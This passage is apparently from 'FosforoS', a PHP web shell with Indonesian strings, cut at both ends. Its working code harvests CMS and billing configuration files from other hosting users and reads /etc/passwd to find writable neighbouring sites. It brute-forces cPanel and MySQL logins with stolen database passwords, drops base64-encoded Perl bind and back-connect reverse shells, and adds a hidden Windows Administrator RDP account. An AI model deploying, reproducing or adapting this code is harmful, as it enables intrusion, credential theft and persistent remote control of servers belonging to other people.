						"/home/$user_FosforoS/public_html/support/configuration.php" => "-support-WHMCS",
						"/home/$user_FosforoS/public_html/clientsupport/configuration.php" => "-clientsupport-WHMCS",
						"/home/$user_FosforoS/public_html/whmcs/configuration.php" => "-whmc-WHMCS",
						"/home/$user_FosforoS/public_html/supp/configuration.php" => "-supp-WHMCS",
						"/home/$user_FosforoS/public_html/secure/configuration.php" => "-sucure-WHMCS",
						"/home/$user_FosforoS/public_html/secure/whm/configuration.php" => "-sucure-whm-WHMCS",
						"/home/$user_FosforoS/public_html/secure/whmcs/configuration.php" => "-sucure-whmcs-WHMCS",
						"/home/$user_FosforoS/public_html/panel/configuration.php" => "-panel-WHMCS",
						"/home/$user_FosforoS/public_html/hosts/configuration.php" => "-hosts-WHMCS",
						"/home/$user_FosforoS/public_html/submitticket.php" => "-submitticket-WHMCS",
						"/home/$user_FosforoS/public_html/clients/configuration.php" => "-clients-WHMCS",
						"/home/$user_FosforoS/public_html/clientes/configuration.php" => "-clientes-WHMCS",
						"/home/$user_FosforoS/public_html/cliente/configuration.php" => "-client-WHMCS",
						"/home/$user_FosforoS/public_html/billing/configuration.php" => "-billing-WHMCS",
						"/home/$user_FosforoS/public_html/manage/configuration.php" => "-whm-manage-WHMCS",
						"/home/$user_FosforoS/public_html/my/configuration.php" => "-whm-my-WHMCS",
						"/home/$user_FosforoS/public_html/myshop/configuration.php" => "-whm-myshop-WHMCS",
						"/home/$user_FosforoS/public_html/billings/configuration.php" => "-billings-WHMCS",
						"/home/$user_FosforoS/public_html/supports/configuration.php" => "-supports-WHMCS",
						"/home/$user_FosforoS/public_html/auto/configuration.php" => "-auto-WHMCS",
						"/home/$user_FosforoS/public_html/go/configuration.php" => "-go-WHMCS",
						"/home/$user_FosforoS/public_html/configuration.php" => "-USERNAME-WHMCS",
						"/home/$user_FosforoS/public_html/bill/configuration.php" => "-bill-WHMCS",
						"/home/$user_FosforoS/public_html/payment/configuration.php" => "-payment-WHMCS",
						"/home/$user_FosforoS/public_html/pay/configuration.php" => "-pay-WHMCS",
						"/home/$user_FosforoS/public_html/purchase/configuration.php" => "-purchase-WHMCS",
						"/home/$user_FosforoS/public_html/clientarea/configuration.php" => "-clientarea-WHMCS",
						"/home/$user_FosforoS/public_html/autobuy/configuration.php" => "-autobuy-WHMCS",
						"/home/$user_FosforoS/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_FosforoS/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_FosforoS/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_FosforoS/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_FosforoS/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_FosforoS/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_FosforoS/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_FosforoS/public_html/forum/config.php" => "phpBB",
						"/home/$user_FosforoS/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_FosforoS/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_FosforoS/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_FosforoS/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_FosforoS/public_html/configuration.php" => "Joomla",
						"/home/$user_FosforoS/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_FosforoS/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_FosforoS/public_html/wp-config.php" => "WordPress",
						"/home/$user_FosforoS/public_html/admin/config.php" => "OpenCart",
						"/home/$user_FosforoS/public_html/slconfig.php" => "Sitelok",
						"/home/$user_FosforoS/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("FosforoS_config/$user_FosforoS-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?FosforoS&dir=$dir/FosforoS_config'><font color=lime>Done</font></a></center>";
}	elseif($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?FosforoS&dir=$url_user'><font color=white>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?FosforoS&dir=$url_user'><font color=white>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?FosforoS&dir=$web_vh'><font color=white>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?FosforoS&dir=$web_vh'><font color=white>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_FosforoS_jump) {
					$user_jumping_dir = "/home/$user_FosforoS_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?FosforoS&dir=$user_jumping_dir'><font color=white>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?FosforoS&dir=$user_jumping_dir'><font color=white>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_FosforoS_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";

} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>FosforoS.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
}elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
} elseif($_GET['do'] == 'network') {
	echo "<form method='post'>
	<u>Bind Port:</u> <br>
	PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
	<input type='submit' name='sub_bp' value='>>'>
	</form>
	<form method='post'>
	<u>Back Connect:</u> <br>
	Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
	PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
	<input type='submit' name='sub_bc' value='>>'>
	</form>";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	if(isset($_POST['sub_bp'])) {
		$f_bp = fopen("/tmp/bp.pl", "w");
		fwrite($f_bp, base64_decode($bind_port_p));
		fclose($f_bp);

		$port = $_POST['port_bind'];
		$out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("/tmp/bp.pl");
	}
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	if(isset($_POST['sub_bc'])) {
		$f_bc = fopen("/tmp/bc.pl", "w");
		fwrite($f_bc, base64_decode($bind_connect_p));
		fclose($f_bc);

		$ipbc = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		$out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("/tmp/bc.pl");
	}
} elseif($_GET['do'] == 'krdp_shell') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".$ip."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user FosforoS");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>	FosforoS</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='FosforoS' required>
			<input type='text' name='pass' placeholder='password' value='FosforoS' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?FosforoS&act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?FosforoS&dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?FosforoS&dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	$delete_dir = rmdir($dir);
	if($delete_dir) {
		$act = "<script>window.location='?FosforoS&dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?FosforoS&act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?FosforoS&act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?FosforoS&act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?FosforoS&act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?FosforoS&act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?FosforoS&act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?FosforoS&act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?FosforoS&act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?FosforoS&act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?FosforoS&act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?FosforoS&dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?FosforoS&act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?FosforoS&act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?FosforoS&act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?FosforoS&act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?FosforoS&act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?FosforoS&dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home1"><center>Name</center></th>
			<th class="th_home1"><center>Type</center></th>
			<th class="th_home1"><center>Size</center></th>
			<th class="th_home1"><center>Last Modified</center></th>
			<th class="th_home1"><center>Owner/Group</center></th>
			<th class="th_home1"><center>Permission</center></th>
			<th class="th_home1"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?FosforoS&dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?FosforoS&dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?FosforoS&dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?FosforoS&act=newfile&dir=$dir'>newfile</a> | <a href='?FosforoS&act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?FosforoS&act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?FosforoS&act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13